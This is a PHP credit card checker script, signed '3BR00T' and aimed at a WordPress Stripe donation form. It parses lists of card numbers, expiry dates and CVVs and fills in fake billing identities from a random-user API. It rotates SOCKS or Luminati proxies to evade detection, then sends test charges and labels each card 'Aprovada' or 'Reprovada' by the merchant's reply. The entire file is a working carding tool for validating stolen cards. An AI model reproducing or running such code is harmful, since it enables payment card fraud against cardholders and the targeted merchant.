<?php

// ++++++++++++++++++++++++++++++++++++++[Woo com Api For Checker ]+++++++++++++++++++++++++++++++++++++++++++++++++++
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$amount = '1.'.rand(50,99);

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

$username = '';
$password = '';
$port =  ;
$session = mt_rand();
$super_proxy = '';


// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[Start Point Gateway Info]++++++++++++++++++++++++++++++++++++++++++++++++++

$ch = curl_init();
/////////========Luminati
curl_setopt($ch, CURLOPT_PROXY, " ");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, " ");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, ' ');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                  'accept: ',
                  'accept-encoding: ',
                  'accept-language: ',
                  'content-type: ',
                  'origin: ',
                  'referer: ',
                  'sec-fetch-mode: cors',));
curl_setopt($ch, CURLOPT_POSTFIELDS, 
                  '');

$result = curl_exec($ch);
$token = trim(strip_tags(getStr($result,'"id": "','"')));

// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[End Point Gateway Info]++++++++++++++++++++++++++++++++++++++++++++++++++++

 $ch = curl_init();
/////////========Luminati
///curl_setopt($ch, CURLOPT_PROXY, " ");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, " ");
// ////////=========Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
 curl_setopt($ch, CURLOPT_URL, ' ');
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                 //  'Host: '
                   'accept: ',
                   'accept-encoding: ',
                   'accept-language: ',
                   'Content-Type: ',
                   'Origin: ',
                   'Referer: ',
                   'Sec-Fetch-Mode: cors',
                   'X-Requested-With: XMLHttpRequest',));
 curl_setopt($ch, CURLOPT_POSTFIELDS, 
                   'action=wp_full_stripe_inline_payment_charge&wpfs-form-name=Donate&wpfs-custom-amount=other&wpfs-custom-amount-unique=1&wpfs-card-holder-name=KRUTIK+RAUT&wpfs-card-holder-email='.$email.'&wpfs-stripe-payment-method-id='.$token.'');


// +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[Echo Info]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
$result = curl_exec($ch);
$message = trim(strip_tags(getStr($result,'"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n"')));

///////////////////////////////////////////////////=========[Responses]

if(strpos($result, '"result":"success"')) {
  echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='green'><font class='badge badge-success'>Charged : 1.00$ [3BR00T]</i></font><br>";
} 
elseif(strpos($result, 'security code is incorrect.')) {
  echo "<font size=2 color='white'><font class='badge badge-white'>Aprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='white'><font class='badge badge-white'>CCN : MATCHED [3BR00T]</i></font><br>";
} 
elseif(strpos($result, 'The card number is incorrect.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Card Number Incorrect [3BR00T]</i></font><br>";
} 
elseif(strpos($result, 'Sorry, we are unable to process your payment at this time. Please retry later.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Card Checked Failed [3BR00T]</i></font><br>";
} 
elseif(strpos($result, 'Sorry, your session has expired. Return to shop')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Api_Status : Dead [3BR00T]</i></font><br>";
} 
elseif(strpos($result, 'The card was declined.')) {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Declined [3BR00T]</i></font><br>";
} 
else {
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada ⍋</i></font> $cc|$mes|$ano|$cvv <font size=2 color='red'><font class='badge badge-danger'>Declined</i></font><br>";
} 

curl_close($ch);
ob_flush();
///Edited by 3BR00T

?>